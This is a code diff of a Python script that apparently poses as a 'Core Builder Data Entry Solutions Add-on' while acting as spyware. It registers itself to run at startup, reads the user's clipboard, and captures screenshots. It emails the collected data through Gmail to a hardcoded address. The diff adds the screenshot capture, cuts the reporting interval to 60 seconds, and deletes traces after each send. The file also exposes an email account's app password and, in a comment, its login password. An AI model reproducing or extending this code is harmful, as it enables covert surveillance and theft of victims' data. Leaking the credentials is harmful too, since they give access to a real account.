@@ -16,31 +16,31 @@ import getpass
 # from pip import main
 import pyperclip
 import pyautogui
-import ctypes
+# import ctypes
 import autorun
-import win32process
+# import win32process
 import  shutil
-import logging
+# import logging
 
-autorun.AddToRegistry('log_file.exe')
+autorun.AddToRegistry()
 
-def start_script():
-    try:
-        main_func()
-    except:
+# def start_script():
+#     try:
+#         main_func()
+#     except:
         
-        handle_crash()
+#         handle_crash()
 
-def handle_crash():
-    time.sleep(5) 
-    start_script()
+# def handle_crash():
+#     time.sleep(5) 
+#     start_script()
 
 
-hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-if hwnd != 0:      
-    ctypes.windll.user32.ShowWindow(hwnd, 0)      
-    ctypes.windll.kernel32.CloseHandle(hwnd)
-    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+# if hwnd != 0:      
+#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
+#     ctypes.windll.kernel32.CloseHandle(hwnd)
+#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 print('program started')
 img_count = 1
@@ -49,7 +49,7 @@ comname = getpass.getuser()
 temp_data = pyperclip.paste()
 
 if not os.path.exists(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt'):
-    with open(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt', 'r+') as clip:
+    with open(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt', 'w') as clip:
         pass
 # autorun.AddToRegistry('datafile.txt')
 
@@ -73,6 +73,10 @@ def isdataavailable():
     # print(f.read())
         data = f.read()
         print(f.read())
+        for i in range(5):
+            if not os.path.exists('C://temp/log{i}.png'):
+                ss = pyautogui.screenshot()
+                ss.save(f'C://temp/log{i}.png')
         if data != '':
             try:
                 server = smtplib.SMTP(host="smtp.gmail.com", port=587)
@@ -86,10 +90,12 @@ def isdataavailable():
                 print('email sent successfully from data function')
                 # terminates the session
                 server.quit()
-                f.truncate()
+                f.truncate(0)
+                shutil.rmtree('C://temp')
                 print('erased data from file.')
             except: 
-                isdataavailable()
+                print("can't send data")
+                # isdataavailable()
         else:
             print('data not available')    
 
@@ -101,7 +107,7 @@ def main_func():
     print('main function started')
     global clipboard_data
     isdataavailable()
-    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
+    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "007711meenakshi@gmail.com"
     EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
     # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
@@ -210,9 +216,9 @@ def main_func():
                 shutil.rmtree('C://temp')
                 clipboard_data = ''
             except:
-                with open('datafile.txt', 'a') as f:
+                with open(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt', 'w') as f:
                     f.write(msg.as_string())
-                clipboard_data = ''
+                # clipboard_data = ''
                 isdataavailable()
         def report(self):
             # if self.log:
@@ -252,7 +258,7 @@ def main_func():
 try:
     # printf("GeeksforGeeks")
     
-    start_script()
+    main_func()
 except Exception as Argument:
  
     # creating/opening a file
@@ -263,7 +269,7 @@ except Exception as Argument:
     
     # closing the file
     f.close()
-    start_script()
+    main_func()
     
 
 
